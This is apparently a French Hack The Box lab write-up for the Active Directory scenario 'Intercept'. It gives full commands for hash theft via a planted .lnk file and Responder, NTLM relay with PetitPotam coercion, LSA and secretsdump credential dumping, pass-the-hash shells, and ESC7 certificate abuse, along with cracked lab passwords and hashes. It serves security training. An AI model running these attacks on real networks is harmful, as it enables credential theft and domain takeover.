---
title: Intercept
date: 2026-03-14 10:28:41
categories: ["Mini-Prolabs", "Hackthebox"]
tags: ["Hard", "Windows", "Active Directory", "NTLM Relay", "ESC7", "LLMNR Poisonning"]
---

![](/images/Intercept/intercept.png)

Intercept est un laboratoire avancé axé sur Active Directory. Ce scénario guide les utilisateurs à travers une énumération réaliste d'AD, des attaques par coercition, l'exploitation de **relais NTLM**, ainsi que l'abus des ADCS mal sécurisés. Intercept s'articule autour de 2 machines et 2 flags.

# Recon 
## TCP Scan

Je commence l'énumération avec un scan TCP complet des deux machines.
- Sur le **DC01 (10.13.38.49)**, les ports suivants sont ouverts : DNS, KERBEROS, SMB, LDAP ainsi que d'autres ports par défaut.
- Sur le **WS01 (10.13.38.50)** les ports SMB, RDP et WinRM sont ouverts.
```js
# Scan on 10.13.38.49 - dc01
[root@exegol-intercept] /workspace
❯ rustscan -a 10.13.38.49

Open 10.13.38.49:53
Open 10.13.38.49:88
Open 10.13.38.49:135
Open 10.13.38.49:139
Open 10.13.38.49:389
Open 10.13.38.49:9389
Open 10.13.38.49:49664
Open 10.13.38.49:49667
Open 10.13.38.49:49668
Open 10.13.38.49:56279
Open 10.13.38.49:56308
Open 10.13.38.49:56797
Open 10.13.38.49:56798
Open 10.13.38.49:56807
Open 10.13.38.49:56880

# Scan on 10.13.38.50 - ws01
[root@exegol-intercept] /workspace
❯ rustscan -a 10.13.38.50

Open 10.13.38.50:135
Open 10.13.38.50:139
Open 10.13.38.50:445
Open 10.13.38.50:3389
Open 10.13.38.50:5985
```

Avec **netexec**, j'ajoute le nom de domaine ainsi que le FQDN des machines dans le fichier `/etc/hosts`.
```js
nxc smb 10.13.38.49-50 --generate-hosts-file /etc/hosts
```

Je vois que l'ajout est bien effectif.
```js
[root@exegol-intercept] /workspace
❯ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::	ip6-localnet
ff00::	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	exegol-intercept
10.13.38.49     DC01.intercept.vl intercept.vl DC01
10.13.38.50     WS01.intercept.vl WS01
```

## SMB

Je peux me connecter en tant qu'anonyme sur les deux machines mais je ne peux pas énumérer les partages. Je vois aussi que la signature est désactivé au niveau du SMB sur les deux machines. Information qui nous sera peut-être utile plus tard.
```js
[root@exegol-intercept] /workspace
❯ nxc smb 10.13.38.49-50 -u '' -p '' --shares                                                                                                                     
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.49     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.50     445    WS01             [+] intercept.vl\:
SMB         10.13.38.50     445    WS01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
SMB         10.13.38.49     445    DC01             [+] intercept.vl\:
SMB         10.13.38.49     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Par contre je peux le faire en tant que Guest sur le **WS01**. J'ai alors les partages suivants :
- **dev** : avec les droits de lecture et écriture
- **IPC$** : avec le droit de lecture
- **Users** : avec le droit de lecture
```js
[root@exegol-intercept] /workspace
❯ nxc smb 10.13.38.49-50 -u 'guest' -p '' --shares
SMB         10.13.38.49     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.49     445    DC01             [-] intercept.vl\guest: STATUS_ACCOUNT_DISABLED
SMB         10.13.38.50     445    WS01             [+] intercept.vl\guest:
SMB         10.13.38.50     445    WS01             [*] Enumerated shares
SMB         10.13.38.50     445    WS01             Share           Permissions     Remark
SMB         10.13.38.50     445    WS01             -----           -----------     ------
SMB         10.13.38.50     445    WS01             ADMIN$                          Remote Admin
SMB         10.13.38.50     445    WS01             C$                              Default share
SMB         10.13.38.50     445    WS01             dev             READ,WRITE      shared developer workspace
SMB         10.13.38.50     445    WS01             IPC$            READ            Remote IPC
SMB         10.13.38.50     445    WS01             Users           READ
```

Avec **smbclient.py**, j'accède au partage dev et je télécharge les deux fichiers **readme.txt** s'y trouvant.
```js
smbclient.py intercept.vl/guest@ws01.intercept.vl
```
![](/images/Intercept/Intercept-1.png)

Voici le contenu du premier readme.txt. Il est indiqué qu'il faut très souvent consulter ce partages pour des mises à jour de l'application. Cela me donne une petite idée d'une attaque à effectuer.
```js
[root@exegol-intercept] /workspace
❯ cat readme.txt
Please check this share regularly for updates to the application (this is a temporary solution until we switch to gitlab).
```

# Connection as Kathryn.Spencer
## RID Brute

Mais en attendant, j'essais d'énumérer les utilisateurs du domaines mais cela ne donne rien.
```js
[root@exegol-intercept] /workspace
❯ nxc smb 10.13.38.49-50 -u 'guest' -p '' --rid-brute
SMB         10.13.38.49     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.49     445    DC01             [-] intercept.vl\guest: STATUS_ACCOUNT_DISABLED
SMB         10.13.38.50     445    WS01             [+] intercept.vl\guest:
SMB         10.13.38.50     445    WS01             500: WS01\Administrator (SidTypeUser)
SMB         10.13.38.50     445    WS01             501: WS01\Guest (SidTypeUser)
SMB         10.13.38.50     445    WS01             503: WS01\DefaultAccount (SidTypeUser)
SMB         10.13.38.50     445    WS01             504: WS01\WDAGUtilityAccount (SidTypeUser)
SMB         10.13.38.50     445    WS01             513: WS01\None (SidTypeGroup)
```

## LLMNR Poisonning

Je reviens ensuite à l'attaque dont j'ai pensé. Puisqu'il est suggérer que certains utilisateurs consulteraient le partage **dev** régulièrement, il se peut qu'ils ouvrent des fichiers s'y trouvant. Donc je crée un fichier malveillant à mettre dans ce partage.
```js
ntlm_theft.py --verbose --generate modern --server "10.10.16.9" --filename "getMe"
```

Je démarre ensuite `responder`.
```js
responder -I tun0
```

J'uploade ensuite le fichier `getMe.lnk` dans le partage **dev** ; et dans la seconde qui suit je récupère le hash NTLMv2 de `Kathryn.Spencer`.
![](/images/Intercept/Intercept-2.png)

Je craque ce hash avec `john` et je récupère le mot de passe **Chocolate1**.
```js
john --wordlist=`fzf-wordlists` kathryn.hash
```
![](/images/Intercept/Intercept-3.png)

Ce mot de passe est bien valide sur les deux machines.
```js
[root@exegol-intercept] /workspace
❯ nxc smb ws01.intercept.vl -u Kathryn.Spencer -p Chocolate1
SMB         10.13.38.50     445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.13.38.50     445    WS01             [+] intercept.vl\Kathryn.Spencer:Chocolate1

[root@exegol-intercept] /workspace
❯ nxc smb dc01.intercept.vl -u Kathryn.Spencer -p Chocolate1
SMB         10.13.38.49     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.49     445    DC01             [+] intercept.vl\Kathryn.Spencer:Chocolate1
```

# Shell as Simon.Bowel
## Bloodhound

J'utilise alors `rusthound` afin de récolter les relations entre les objets du domaine, puis les analyser dans `bloodhound-ce`.
```js
[root@exegol-intercept] /workspace
❯ rusthound -f dc01.intercept.vl -u Kathryn.Spencer -p Chocolate1 -d intercept.vl
---------------------------------------------------
Initializing RustHound at 22:21:36 on 01/19/26
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2026-01-19T21:21:36Z INFO  rusthound] Verbosity level: Info
[2026-01-19T21:21:36Z INFO  rusthound::ldap] Connected to INTERCEPT.VL Active Directory!
[2026-01-19T21:21:36Z INFO  rusthound::ldap] Starting data collection...
[2026-01-19T21:21:37Z INFO  rusthound::ldap] All data collected for NamingContext DC=intercept,DC=vl
[2026-01-19T21:21:37Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2026-01-19T21:21:37Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2026-01-19T21:21:37Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2026-01-19T21:21:37Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2026-01-19T21:21:37Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 14 users parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_users.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 63 groups parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_groups.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 2 computers parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_computers.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 4 ous parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_ous.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 1 domains parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_domains.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 2 gpos parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_gpos.json created!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] 21 containers parsed!
[2026-01-19T21:21:37Z INFO  rusthound::json::maker] .//20260119222137_intercept-vl_containers.json created!

RustHound Enumeration Completed at 22:21:37 on 01/19/26! Happy Graphing!
```

`Administrator` et `Rhys.King` sont les deux administrateurs du domaine.
![](/images/Intercept/Intercept-4.png)

`Vincent.Wood` possède les droits `WriteAccountRestrictions` sur la machine **WS01**. Ce qui signifie qu'il peut modifier l'attribut `msDS-AllowedToActOnBehalfOfOtherIdentity` de cette dernière lui permettant d'effectuer une [RBCD]([(RBCD) Resource-based constrained | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)).
![](/images/Intercept/Intercept-5.png)

`Simon.Bowen` quant à lui est membre du groupe **HELPDESK** qui a le droit `GenericAll` sur le groupe **CA-MANAGERS** ainsi que l'OU **CA-MANAGERS**.
![](/images/Intercept/Intercept-6.png)

## NTLM Relay

Jusque là on a des scénarios d'attaques mais on a pas encore compromis ces utilisateurs. Une chose que je décide alors de vérifier est la signature LDAP sur le **DC01**. Puisque jusque là on avait vu que la signature SMB était désactivé sur les deux machines.
Donc avec [LdapRelayScan](https://github.com/zyn3rgy/LdapRelayScan), je vois que la signature ainsi que le **binding** LDAP sont désactivés sur le `DC01`. Je peux donc exploiter l'attaque par [relais NTLM](https://www.thehacker.recipes/ad/movement/ntlm/relay#abuse).
```js
LdapRelayScan.py -u Kathryn.Spencer -p Chocolate1 -dc-ip "10.13.38.49" -method BOTH
```
![](/images/Intercept/Intercept-7.png)

La première étape de cette attaque est de créer un enregistrement DNS sur le **DC01** pointant vers l'adresse IP de ma machine attaquante.
```js
dnstool.py -u 'intercept.vl\Kathryn.Spencer' -p Chocolate1 -r 'attacker.intercept.vl' -d '10.10.16.9' --action add 'dc01.intercept.vl' -dns-ip 10.13.38.49
```
![](/images/Intercept/Intercept-8.png)

J'ajoute ensuite la ligne `nameserver 10.13.38.49` dans le fichier `/etc/resolv.conf` de ma machine.
![](/images/Intercept/Intercept-9.png)

Avec `nslookup`, je vois que la résolution vers `attacker.intercept.vl` pointe bien vers mon adresse IP.
```js
nslookup attacker.intercept.vl dc01.intercept.vl
```
![](/images/Intercept/Intercept-10.png)

J'utilise alors le module `coerce_plus` de **netexec** pour voir à quel scénario cette machine est vulnérable.
```js
[root@exegol-intercept] /workspace
❯ nxc smb 10.13.38.49 -u Kathryn.Spencer -p Chocolate1 -M coerce_plus
SMB         10.13.38.49     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.13.38.49     445    DC01             [+] intercept.vl\Kathryn.Spencer:Chocolate1
COERCE_PLUS 10.13.38.49     445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.13.38.49     445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.13.38.49     445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.13.38.49     445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.13.38.49     445    DC01             VULNERABLE, MSEven
```

Ensuite avec [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), j'écoute les connexions NTLM entrantes. Je l'utilise avec les options suivantes :
- **`-t ldaps://dc01.intercept.vl`** : pour relayer l'authentification NTLM vers ce serveur LDAPS `dc01.intercept.vl`.
- **`--delegate-access`** : Si le relais réussit, active la [délégation contrainte](https://beta.hackndo.com/constrained-unconstrained-delegation/#kerberos-constrained-delegation) pour l'utilisateur relayé, permettant des attaques avancées comme l'accès à d'autres services.
- **`-smb2support`** : Active le support SMBv2 pour une compatibilité accrue avec les clients modernes.
```sh
ntlmrelayx.py -t ldaps://dc01.intercept.vl --delegate-access -smb2support
```
![](/images/Intercept/Intercept-11.png)

J'utilise ensuite `PetitPotam` pour forcer une authentification depuis `WS01` vers notre relais. L'attaque a fonctionné.
```js
petitpotam.py -d "intercept.vl" -u "Kathryn.Spencer" -p "Chocolate1" attacker@80/aaa "ws01.intercept.vl"
```
![](/images/Intercept/Intercept-12.png)

Cela a donc créé un compte machine qui peut **usurper l'identité de n'importe quel utilisateur** sur la machine **WS01**.
![](/images/Intercept/Intercept-13.png)

Je demande alors un TGT en tant que l'utilisateur `Administrator` local de **WS01**.
```js
getST.py -spn HOST/WS01.intercept.vl 'intercept.vl/FVUMYYRJ$:UJ3fd-z7m{Ft>Yf' -dc-ip 10.13.38.49 -impersonate Administrator
```
![](/images/Intercept/Intercept-14.png)

J'exporte ce ticket dans la variable **`KRB5CCNAME`** et je vois que le ticket est bien valide.
```js
export KRB5CCNAME=Administrator@HOST_WS01.intercept.vl@INTERCEPT.VL.ccache
nxc smb ws01.intercept.vl --use-kcache
```
![](/images/Intercept/Intercept-16.png)

Je dump la LSA et je trouve alors les identifiants de `Simon.Bowel`. La LSA est un **composant central de sécurité dans Windows** qui gère **l’authentification des utilisateurs et les secrets de sécurité du système**.
Elle garde certains **secrets sensibles**, appelés **LSA secrets**, par exemple :
- les mots de passe de comptes de services
- les identifiants de tâches planifiées
- les clés utilisées par certains services
- les informations de domaine mises en cache
```js
nxc smb ws01.intercept.vl --use-kcache --lsa
```
![](/images/Intercept/Intercept-15.png)

Je peux aussi dumper tous les hash et mot de passe avec `secretsdump`.
```js
secretsdump ws01.intercept.vl -k
```
![](/images/Intercept/Intercept-17.png)

## Shell on WS01

Récupération du flag `Intercept Master`.
```sh
evil-winrm -u Administrator -H 831cbc509daa37aff98250b635e7f482 -i ws01.intercept.vl
```
![](/images/Intercept/Intercept-18.png)


# Shell as Administrator

Les identifiants trouvés sont valides
![](/images/Intercept/Intercept-19.png)

`Simon.Bowen` est membre du groupe **HELPDESK** qui a le droit `GenericAll` sur le groupe **CA-MANAGERS** ainsi que l'OU **CA-MANAGERS**.
![](/images/Intercept/Intercept-6.png)


## Add Simon.Bowen to CA-MANAGERS

J'ajoute `Simon.Bowen` au groupe `CA-MANAGERS`.
```js
[root@exegol-intercept] /workspace
❯ bloodyAD --host 10.13.38.49 -d intercept.vl -u Simon.Bowen -p 'b0OI_fHO859+Aw' add groupMember CA-MANAGERS Simon.Bowen
[+] Simon.Bowen added to CA-MANAGERS
```

## ESC7

Étant membre de ce groupe, il peut maintenant énumérer et gérer tous les certificats. J'utilise donc `certipy` pour lister les certificats vulnérables. L'autorité de certificat est vulnérable à une **ESC7**.
Une **ESC7** apparaît quand un utilisateur ou groupe **a trop de permissions sur l’Autorité de Certification (CA)**. Ces droits permettent potentiellement de **délivrer des certificats pour n’importe quel utilisateur**, y compris un **administrateur du domaine**.
```js
certipy -debug find -target DC01.intercept.vl -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -stdout -vulnerable
```
![](/images/Intercept/Intercept-20.png)

Pour approuver les certificats, on peut je m'ajoute comme **officer**.
```js
certipy ca -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -ns '10.13.38.49' -target 'DC01.intercept.vl' -ca 'intercept-DC01-CA' -add-officer Simon.Bowen
```
![](/images/Intercept/Intercept-21.png)

Je m'assure que le template **`SubCA`** est activé sur le CA.
```js
certipy ca -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -ns '10.13.38.49' -target 'DC01.intercept.vl' -ca 'intercept-DC01-CA' -enable-template 'SubCA'
```
![](/images/Intercept/Intercept-22.png)

Je fais ensuite une demande de certificat **`SubCA`** pour **Administrator**. Parce que `Simon.Bowel` n'a pas **le droit d’enrollment direct**, la requête est refusée, mais un identifiant de requête est généré. La clé privée associée de la CSR doit être enregistrée.
```js
certipy req -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -ns '10.13.38.49' -target 'DC01.intercept.vl' -ca 'intercept-DC01-CA' -template 'SubCA' -upn 'administrator@intercept.vl' -sid 'S-1-5-21-3031021547-1480128195-3014128932-500'
```
![](/images/Intercept/Intercept-23.png)

Mais grâce au rôle **Certificate Officer** qu'on s'est attribué, `Simon.Bowel` peut approuver la demande. Le certificat est alors généré.
```js
certipy ca -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -ns '10.13.38.49' -target 'DC01.intercept.vl' -ca 'intercept-DC01-CA' -issue-request '17'
```
![](/images/Intercept/Intercept-24.png)

Je peux récupérer le certificat désormais approuvé, en utilisant l'ID de la requête et la clé privée enregistrée à l'étape précédente. Je possède désormais le certificat **`administrator.pfx`**, associé au compte Administrator.
```js
certipy req -u Simon.Bowen@intercept.vl -p 'b0OI_fHO859+Aw' -ns '10.13.38.49' -target 'DC01.intercept.vl' -ca 'intercept-DC01-CA' -retrieve '17'
```
![](/images/Intercept/Intercept-25.png)

J'utilise la commande suivante pour s'authentifier et obtenir un accès privilégié. Je récupère alors le hash de l'utilisateur `Administrator`.
```js
certipy auth -pfx administrator.pfx -username administrator -dc-ip 10.13.38.49
```
![](/images/Intercept/Intercept-26.png)

## Shell on DC01

Je me connecte en tant qu'administrateur du domaine et je peux récupérer le flag `Relayed`.
```js
evil-winrm -u Administrator -H ad95c338a6cc5729ae7390acbe0ca91f -i dc01.intercept.vl
```
![](/images/Intercept/Intercept-27.png)


